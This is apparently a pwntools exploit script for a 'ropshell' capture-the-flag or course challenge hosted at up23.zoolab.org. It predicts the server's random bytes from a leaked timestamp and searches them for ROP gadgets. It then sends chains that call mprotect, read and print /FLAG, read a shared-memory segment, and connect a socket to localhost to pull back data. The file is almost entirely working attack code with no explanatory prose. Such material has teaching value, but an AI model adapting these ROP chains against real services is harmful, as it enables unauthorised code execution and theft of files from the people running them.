#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes, random
import socket

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
r.recvuntil(b'** Timestamp is ')
t = int(r.recvuntil(b'\n', drop=True))
r.recvuntil(b'** Random bytes generated at ')
bytes_addr = int(r.recvuntil(b'\n', drop=True), base=16)
len_code = 10*0x10000

libc = ctypes.CDLL('libc.so.6')
# code = libc.mmap(bytes_addr, len_code, 0x7, 0x22, -1, 0)
# code_int = ctypes.cast(code, ctypes.POINTER(ctypes.c_uint32))
code_int = list()
libc.srand(t)
for i in range(len_code // 4):
    # data = ctypes.c_uint32(libc.rand() << 16 | libc.rand() & 0xffff)
    # print(type(libc.rand() << 16 | libc.rand() & 0xffff))
    data = ctypes.c_uint32(ctypes.c_uint32(libc.rand() << 16).value | libc.rand() & 0xffff).value
    # print(data)
    for j in range(4):
        tmp = data%256
        code_int.append(tmp)
        data = (data >> 8)
    # if code_int[i] == target:
    #     print("!!! find target !!!!")
# print(code_int)
# print(len(code_int), libc.rand() % (len_code/4-1))

tmp2 = 0xc3050f
tmp_addr = (libc.rand() % (len_code//4 - 1))*4
print(tmp_addr, len(code_int))
for j in range(4):  
    # tmp = tmp2%256
    code_int[tmp_addr + j] = (tmp2%256)
    tmp2 = (tmp2 >> 8)
# code_int[libc.rand() % (len_code//4 - 1)] = 0xc3050f
code_int = bytes(code_int)
# print(code_int[tmp_addr: tmp_addr+4])
# print("t=", t)
# print("bytes=", bytes_addr)
target_rax = int.from_bytes(asm('''pop rax
ret'''), byteorder='little')
target_rdi = int.from_bytes(asm('''pop rdi
ret'''), byteorder='little')
target_rsi = int.from_bytes(asm('''pop rsi
ret'''), byteorder='little')
target_rdx = int.from_bytes(asm('''pop rdx
ret'''), byteorder='little')
target_movsb = int.from_bytes(asm('''movsb
ret'''), byteorder='little')
target_syscall = int.from_bytes(asm('''syscall
ret'''), byteorder='little')
# target_rax = asm('''pop rax
# ret''')
# target_rdi = asm('''pop rdi
# ret''')
# target_syscall = asm('''syscall
# ret''')
# print("rax:", len(target_rax), "rdi:", len(target_rdi),  "syscall:", len(target_syscall))

# print(target_rax)
syscall_pos, rax_pos, rdi_pos, rsi_pos, rdx_pos, mv_pos, ret_pos, movsb_pos = 0, 0, 0, 0, 0, 0, 0, 0
# byte_data = ctypes.cast(code_int, ctypes.POINTER(ctypes.c_ubyte))
# print(code_int)
for i in range(len_code-2):
    data = int.from_bytes(code_int[i: i+3], byteorder='little')
    # if i == tmp_addr:
    #     print(data, target_syscall)
    # data = ctypes.c_uint32.from_buffer_copy(bytes(byte_data[i: i+4])).value
    if data == target_syscall:
        # print(f"syscall at {i}")  
        syscall_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
        # break
for i in range(len_code-1):
    # data = ctypes.c_uint16.from_buffer_copy(bytes(byte_data[i: i+2])).value
    data = int.from_bytes(code_int[i: i+2], byteorder='little')
    # if rax_pos == 0 or rdi_pos == 0 or rsi_pos == 0 or rdx_pos == 0  or movsb_pos == 0:
    if data == target_rax:
        # print(f"rax at {i}")
        rax_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_rdi:
        # print(f"rdi at {i}")
        rdi_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_rsi:
        # print(f"rsi at {i}")
        rsi_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_rdx:
        # print(f"rdx at {i}")
        rdx_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_movsb:
        # print(f"movsb at {i}")
        movsb_pos = (bytes_addr+i).to_bytes(8, byteorder='little')

target_push_rax = int.from_bytes(asm('''push rax'''), byteorder='little')
target_pop_rdi = int.from_bytes(asm('''pop rdi'''), byteorder='little')
target_pop_rdx = int.from_bytes(asm('''pop rdx'''), byteorder='little')
target_pop_rsi = int.from_bytes(asm('''pop rsi'''), byteorder='little')
target_ret = int.from_bytes(asm('''ret'''), byteorder='little')
slash_pos, F_pos, L_pos, A_pos, G_pos, end_pos, push_rax_pos, pop_rdi_pos, pop_rdx_pos, pop_rsi_pos, ret_pos = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
for i in range(len_code):
    # data = ctypes.c_uint16.from_buffer_copy(bytes(byte_data[i: i+2])).value
    data = int.from_bytes(code_int[i: i+1], byteorder='little')
    # if slash_pos == 0 or F_pos == 0 or L_pos == 0 or A_pos == 0  or G_pos == 0 or end_pos == 0:
    if data == int.from_bytes(b'/', byteorder='little'):
        # print(f"\'/\' at {i}")
        slash_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == int.from_bytes(b'F', byteorder='little'):
        # print(f"F at {i}")
        F_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == int.from_bytes(b'L', byteorder='little'):
        # print(f"L at {i}")
        L_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == int.from_bytes(b'A', byteorder='little'):
        # print(f"A at {i}")
        A_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == int.from_bytes(b'G', byteorder='little'):
        # print(f"G at {i}")
        G_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == int.from_bytes(b'\0', byteorder='little'):
        # print(f"\\0 at {i}")
        end_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_push_rax:
        # print(f"push_rax at {i}")
        push_rax_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_pop_rdi:
        # print(f"pop_rdi at {i}")
        pop_rdi_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_pop_rdx:
        # print(f"pop_rdx at {i}")
        pop_rdx_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_pop_rsi:
        # print(f"pop_rsi at {i}")
        pop_rsi_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == target_ret:
        # print(f"ret at {i}")
        ret_pos = (bytes_addr+i).to_bytes(8, byteorder='little')

    # else:
    #     break
#!FOR DEBUG!#
senddata = bytearray()
rax_value = 1 #write
rdi_value = 1 #STDOUT
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rsi_pos + (bytes_addr).to_bytes(8, byteorder='little') 
        + syscall_pos)

# ###! TASK 1 !###
# rax_value = 60
# rdi_value = 37
# senddata = bytearray()
# # print(rax_pos + rax_value.to_bytes(8, byteorder='little') + rdi_pos + rdi_value.to_bytes(8, byteorder='little') + syscall_pos)
# senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') + rdi_pos + rdi_value.to_bytes(8, byteorder='little') + syscall_pos) 
# r.send(senddata)

###! TASK 2 !###
senddata = bytearray()
#!mprotect
rax_value = 10
rdi_value = bytes_addr
rsi_value = len_code
rdx_value = 0x7
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)

#! write '/FLAG'
rdi_value = bytes_addr
senddata += (rsi_pos + slash_pos
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + F_pos
        + rdi_pos + (rdi_value+1).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + L_pos
        + rdi_pos + (rdi_value+2).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + A_pos
        + rdi_pos + (rdi_value+3).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + G_pos
        + rdi_pos + (rdi_value+4).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+5).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! write 'push rax; pop rdi; ret'
rdi_value = bytes_addr
senddata += (rsi_pos + push_rax_pos
        + rdi_pos + (rdi_value+10).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + pop_rdi_pos
        + rdi_pos + (rdi_value+11).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ret_pos
        + rdi_pos + (rdi_value+12).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+13).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! write 'push rax; pop rdx; ret'
rdi_value = bytes_addr
senddata += (rsi_pos + push_rax_pos
        + rdi_pos + (rdi_value+20).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + pop_rdx_pos
        + rdi_pos + (rdi_value+21).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ret_pos
        + rdi_pos + (rdi_value+22).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+23).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! open
rax_value = 2 #open
rsi_value = 0 #O_RDONLY
rdx_value = 0 #no need
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + bytes_addr.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! rax to rdi 
senddata += ((bytes_addr+10).to_bytes(8, byteorder='little'))
#! read
rax_value = 0
rsi_value = bytes_addr + 50
rdx_value = 100
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! read size to rdx
senddata += ((bytes_addr+20).to_bytes(8, byteorder='little'))
#!write
rax_value = 1 #write
rdi_value = 1 #STDOUT
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + syscall_pos)
#! exit
rax_value = 60 #exit
rdi_value = 0
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little') 
        + syscall_pos)
r.send(senddata)

###! TASK3 !###
senddata = bytearray()
key = 0x1337
#!mprotect
rax_value = 10
rdi_value = bytes_addr
rsi_value = len_code
rdx_value = 0x7
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! write 'push rax; pop rdi; ret'
rdi_value = bytes_addr
senddata += (rsi_pos + push_rax_pos
        + rdi_pos + (rdi_value+10).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + pop_rdi_pos
        + rdi_pos + (rdi_value+11).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ret_pos
        + rdi_pos + (rdi_value+12).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+13).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! write 'push rax; pop rsi; ret'
rdi_value = bytes_addr
senddata += (rsi_pos + push_rax_pos
        + rdi_pos + (rdi_value+30).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + pop_rsi_pos
        + rdi_pos + (rdi_value+31).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ret_pos
        + rdi_pos + (rdi_value+32).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+33).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! shmget
rax_value = 29
rdi_value = 0x1337
rsi_value = 0
rdx_value = 0
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)

#! rax to rdi 
senddata += ((bytes_addr+10).to_bytes(8, byteorder='little'))

#! shmat
rax_value = 30
rsi_value = 0
rdx_value = 0x1000
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
# #! rax to rdi 
# senddata += ((bytes_addr+10).to_bytes(8, byteorder='little'))

#! rax to rsi 
senddata += ((bytes_addr+30).to_bytes(8, byteorder='little'))

#!write
rax_value = 1 #write
rdi_value = 1 #STDOUT
rdx_value = 69
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little') 
        + syscall_pos)
#! exit
rax_value = 60 #exit
rdi_value = 0
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little')  
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')  
        + syscall_pos)
r.send(senddata)

###! TASK4 !###
senddata = bytearray()
port = 0x1337
# print("in here")
family_pos, port1_pos, por2_pos, ip1_pos, ip2_pos = 0, 0, 0, 0, 0
for i in range(len_code-1):
    # data = ctypes.c_uint16.from_buffer_copy(bytes(byte_data[i: i+2])).value
    data = int.from_bytes(code_int[i: i+2], byteorder='little')
    # if rax_pos == 0 or rdi_pos == 0 or rsi_pos == 0 or rdx_pos == 0  or movsb_pos == 0:
    if data == port:
        # print(f"port offset at {i}")
        port_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
for i in range(len_code):
    # data = ctypes.c_uint16.from_buffer_copy(bytes(byte_data[i: i+2])).value
    data = int.from_bytes(code_int[i: i+1], byteorder='little')
    # if rax_pos == 0 or rdi_pos == 0 or rsi_pos == 0 or rdx_pos == 0  or movsb_pos == 0:
    if data == 2:
        # print(f"family offset at {i}")
        family_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == 0x13:
        # print(f"port1 offset at {i}")
        port1_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == 0x37:
        # print(f"port2 offset at {i}")
        port2_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == 127:
        # print(f"ip1 offset at {i}")
        ip1_pos = (bytes_addr+i).to_bytes(8, byteorder='little')
    if data == 1:
        # print(f"ip2 offset at {i}")
        ip2_pos = (bytes_addr+i).to_bytes(8, byteorder='little')

#!mprotect
rax_value = 10
rdi_value = bytes_addr
rsi_value = len_code
rdx_value = 0x7
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! write 'family, port, ip'
rdi_value = bytes_addr
senddata += (rsi_pos + family_pos
        + rdi_pos + (rdi_value+50).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+51).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + port1_pos
        + rdi_pos + (rdi_value+52).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + port2_pos
        + rdi_pos + (rdi_value+53).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ip1_pos
        + rdi_pos + (rdi_value+54).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+55).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+56).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ip2_pos
        + rdi_pos + (rdi_value+57).to_bytes(8, byteorder='little')
        + movsb_pos
        )
for i in range(8):
    senddata += (rsi_pos + end_pos
                + rdi_pos + (rdi_value+(58+i)).to_bytes(8, byteorder='little')
                + movsb_pos)
#! write 'push rax; pop rdi; ret'
rdi_value = bytes_addr
senddata += (rsi_pos + push_rax_pos
        + rdi_pos + (rdi_value+10).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + pop_rdi_pos
        + rdi_pos + (rdi_value+11).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ret_pos
        + rdi_pos + (rdi_value+12).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+13).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! write 'push rax; pop rdx; ret'
rdi_value = bytes_addr
senddata += (rsi_pos + push_rax_pos
        + rdi_pos + (rdi_value+20).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + pop_rdx_pos
        + rdi_pos + (rdi_value+21).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + ret_pos
        + rdi_pos + (rdi_value+22).to_bytes(8, byteorder='little')
        + movsb_pos
        + rsi_pos + end_pos
        + rdi_pos + (rdi_value+23).to_bytes(8, byteorder='little')
        + movsb_pos
        )
#! socket
rax_value = 41
rdi_value = 2    #family
rsi_value = 1    #type
rdx_value = 0    #protocol
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! rax to rdi 
senddata += ((bytes_addr+10).to_bytes(8, byteorder='little'))
#! connect
rax_value = 42
rsi_value = bytes_addr+50    #type
rdx_value = 16    #protocol
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        # + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! read
rax_value = 0
rsi_value = bytes_addr + 100
rdx_value = 100
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + rdx_pos + rdx_value.to_bytes(8, byteorder='little')
        + syscall_pos)
#! read size to rdx
senddata += ((bytes_addr+20).to_bytes(8, byteorder='little'))
#!write
rax_value = 1 #write
rdi_value = 1 #STDOUT
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little') 
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')
        + rsi_pos + rsi_value.to_bytes(8, byteorder='little') 
        + syscall_pos)
#! exit
rax_value = 60 #exit
rdi_value = 0
senddata += (rax_pos + rax_value.to_bytes(8, byteorder='little')  
        + rdi_pos + rdi_value.to_bytes(8, byteorder='little')  
        + syscall_pos)
r.send(senddata)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :